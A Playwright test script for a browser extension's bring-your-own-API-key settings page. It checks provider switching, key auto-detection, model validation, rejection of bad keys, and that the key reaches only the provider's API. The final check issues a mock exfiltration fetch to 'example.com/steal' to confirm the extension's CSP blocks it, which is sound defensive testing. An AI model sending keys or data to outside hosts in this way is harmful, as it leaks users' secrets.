/**
 * Settings / bring-your-own-key test with a real key.
 *   GROQ_API_KEY=gsk_... PW_EXPERIMENTAL_SERVICE_WORKER_NETWORK_EVENTS=1 node tests/settings-byok.mjs
 */
import { chromium } from 'playwright';
import { execSync } from 'node:child_process';
import path from 'node:path';
import fs from 'node:fs';
import { fileURLToPath } from 'node:url';
const here = path.dirname(fileURLToPath(import.meta.url));
execSync('node extension/build.mjs', { cwd: path.join(here, '..'), env: { ...process.env, CONTEXTPORT_TEST_BUILD: '1' }, stdio: 'ignore' });
const ext = path.join(here, '../extension/dist-test');
const S = path.join(here, 'artifacts'); fs.mkdirSync(S, { recursive: true }); const KEY = process.env.GROQ_API_KEY;
const ok = (name, cond, extra = '') => console.log(`${cond ? '✓' : '✗'} ${name}${extra ? ' — ' + extra : ''}`);
const ctx = await chromium.launchPersistentContext('', { channel: 'chromium', headless: true, colorScheme: 'dark', viewport: { width: 1100, height: 1000 },
  args: [`--disable-extensions-except=${ext}`, `--load-extension=${ext}`] });
let [sw] = ctx.serviceWorkers(); if (!sw) sw = await ctx.waitForEvent('serviceworker');
const id = new URL(sw.url()).host;
const seen = [];
ctx.on('request', (r) => seen.push({ url: r.url(), auth: r.headers()['authorization'] || '', body: r.postData() || '' }));
const p = await ctx.newPage();
await p.goto(`chrome-extension://${id}/options/options.html`);
await p.locator('.engine').first().waitFor();
await p.waitForTimeout(1500); // let usage refresh happen

// 1) The reported bug: pick BYOK, change provider -> panel must stay open
await p.locator('.engine').nth(1).click();
await p.locator('#provider').selectOption('anthropic');
await p.waitForTimeout(800);
ok('Panel stays open after changing provider (bug fix)', await p.locator('#model').isVisible());
ok('Model default follows provider', (await p.locator('#model').inputValue()) === 'claude-opus-5', await p.locator('#model').inputValue());
await p.locator('#provider').selectOption('mistral');
await p.waitForTimeout(500);
ok('Panel still open after second provider change', await p.locator('#key-input').isVisible());

// 2) Paste a Groq key while Mistral is selected -> auto-detect
await p.locator('#key-input').fill(KEY);
await p.waitForTimeout(800);
ok('Pasting a gsk_ key auto-selects Groq', (await p.locator('#provider').inputValue()) === 'groq');

// 3) Wrong model name -> fails at model step with suggestions
await p.locator('#model').fill('gpt-oss-120');
await p.locator('#verify-btn').click();
await p.locator('.vstep.fail, .vstep.ok').first().waitFor({ timeout: 60000 });
await p.waitForTimeout(300);
const failText = await p.locator('.vstep.fail').innerText().catch(() => '');
const chips = await p.locator('.chip-btn').allInnerTexts();
ok('Unknown model is caught at the model step', /doesn't offer "gpt-oss-120"/.test(failText), failText);
ok('Closest real models suggested', chips.includes('openai/gpt-oss-120b'), chips.join(', '));
await p.screenshot({ path: S + '/byok-suggest.png', fullPage: true });

// 4) Click suggestion -> verifies and saves
await p.locator('.chip-btn', { hasText: 'openai/gpt-oss-120b' }).click();
await p.locator('.vsteps .vstep.ok >> nth=2').waitFor({ timeout: 60000 });
const okText = await p.locator('.vsteps').innerText();
ok('Suggestion verifies: key + model + test request', /API key is valid/.test(okText) && /Test request answered/.test(okText), okText.replace(/\n/g, ' | '));
const st = await sw.evaluate(async () => (await chrome.storage.local.get('settings')).settings);
ok('Saved as active engine', st.engine === 'byok' && st.provider === 'groq' && st.models.groq === 'openai/gpt-oss-120b');
await p.screenshot({ path: S + '/byok-ok.png', fullPage: true });

// 5) Any model from the key's list, typed freely (not in examples)
await p.locator('#model').fill('llama-3.1-8b-instant');
await p.locator('#verify-btn').click();
await p.locator('.vsteps .vstep.ok, .vsteps .vstep.fail').first().waitFor({ timeout: 60000 });
await p.waitForTimeout(500);
await p.locator('.vsteps').innerText().then((t) => ok('Free-typed model id is checked against the key', /available|works|doesn't offer/.test(t), t.replace(/\n/g, ' | ')));

// 6) Bad key -> fails at key step, nothing saved
await p.locator('#key-input').fill('gsk_' + 'x'.repeat(48));
await p.locator('#model').fill('openai/gpt-oss-120b');
await p.locator('#verify-btn').click();
await p.locator('.vstep.fail').waitFor({ timeout: 60000 });
ok('Invalid key caught at the key step', /rejected the API key/.test(await p.locator('.vstep.fail').innerText()));
const keyStill = await sw.evaluate(() => new Promise((res) => { const r = indexedDB.open('contextport'); r.onerror = () => res(null); r.onsuccess = () => { const g = r.result.transaction('secrets').objectStore('secrets').get('key:groq'); g.onsuccess = () => res(g.result); }; }));
ok('Invalid key did not overwrite the good one', keyStill === KEY);

// 7) Key never goes anywhere except the provider
const leaks = seen.filter((r) => (r.auth.includes(KEY) || r.body.includes(KEY) || r.url.includes(KEY)) && !r.url.startsWith('https://api.groq.com/'));
ok('Key only ever sent to api.groq.com', leaks.length === 0, `${seen.filter((r) => r.url.startsWith('https://api.groq.com')).length} provider requests observed`);
ok('Key never shown back in the page', !(await p.content()).includes(KEY.slice(8)));

// 8) CSP network allowlist blocks exfiltration from the extension
const blocked = await sw.evaluate(async () => { try { await fetch('https://example.com/steal?k=1'); return false; } catch { return true; } });
ok('Extension cannot send data to non-allowlisted hosts (CSP)', blocked);
await ctx.close();
